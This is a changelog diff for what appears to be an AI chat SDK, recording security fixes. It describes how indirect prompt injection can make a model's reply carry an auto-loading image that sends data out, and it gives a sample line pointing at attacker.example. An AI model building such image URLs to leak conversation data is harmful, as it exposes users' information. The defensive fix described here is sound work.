@@ -2,6 +2,12 @@
 
 ## [Unreleased]
 
+### Security
+
+- **An image in a model's reply no longer loads itself.** A reply is untrusted — indirect prompt injection arrives through web search, an uploaded document or a tool result — and an image is the sharpest way out of the page, because the model chooses the host *and* the query string. `![](https://attacker.example/x.png?d=…)` fetched the moment the reply rendered, with nobody clicking anything, sending whatever the model packed into that URL. `/ui` has refused images since ADR 0009; the packaged chat, which is the recommended surface, did not. An image is now the link that ADR describes — "Image: alt (host)" — and nothing in a reply fetches on its own. An image whose URL is not http(s) keeps its label and loses its destination.
+- **A withdrawn client tool can no longer run.** `register()` replaced the tool schemas wholesale but only added to the handler and permission maps, so a tool dropped from a later registration stayed executable — and with its schema gone, argument validation waved anything through. Both maps are rebuilt from the tools being registered. The engine validates too, so this was defence in depth rather than a live hole.
+- **An insecure `baseUrl` now says so.** Every request carries the end-user's access token in a header; over plain http that token crosses the network in the clear, and a typo in an environment variable is all it takes. The client warns once at construction, and exempts local addresses, which is how people develop.
+
 ### Fixed
 
 - **A mistyped partner key no longer tells the end-user their session expired.** The engine only names a bad key on `POST /v1/auth/anonymous`; every later call has no user token yet, so it answers "Missing authorization token", which the SDK read as an expired session — and said so, to the wrong person. `partner_key_error` now stops the chat where it is raised, with its own message: *This app isn't set up correctly, so chat is unavailable. Please contact support.* No sign-in form, because signing in cannot fix it, and the notice stays up for a signed-in end-user too.
